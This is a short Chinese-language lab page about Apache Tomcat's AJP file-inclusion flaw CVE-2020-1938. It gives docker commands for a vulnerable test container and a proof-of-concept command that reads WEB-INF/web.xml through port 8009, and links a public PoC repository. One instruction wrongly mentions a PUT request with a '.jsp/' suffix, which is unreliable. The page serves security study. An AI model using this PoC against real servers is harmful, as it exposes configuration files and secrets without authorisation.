## Tomcat Apache Tomcat 文件包含漏洞(CVE-2020-1938)

### 漏洞信息

 * [Fixed in Apache Tomcat 8.5.51](https://tomcat.apache.org/security-8.html#Fixed_in_Apache_Tomcat_8.5.51)
 * [【威胁通告】Apache Tomcat 文件包含漏洞（CVE-2020-1938）](http://blog.nsfocus.net/cve-2020-1938/)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:t_tomcat_2
 ```

2. 启动环境

 ```
$ docker run -d -p 8080:8080 medicean/vulapps:t_tomcat_2
 ```
 > `-p 8080:8080` 前面的 8080 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### PoC

1. 向目标发起 PUT 请求，注意后缀为 `.jsp/`

```
python poc.py 127.0.0.1 -p 8009 -f WEB-INF/web.xml
```

> POC来源:[https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
### 参考链接

* [Apache-Tomcat-Ajp漏洞(CVE-2020-1938)漏洞复现（含有poc）](https://www.cnblogs.com/L0ading/p/12341112.html)
* [Apache-Tomcat-Ajp漏洞(CVE-2020-1938)漏洞复现](https://www.liuyixiang.com/post/109123.html)
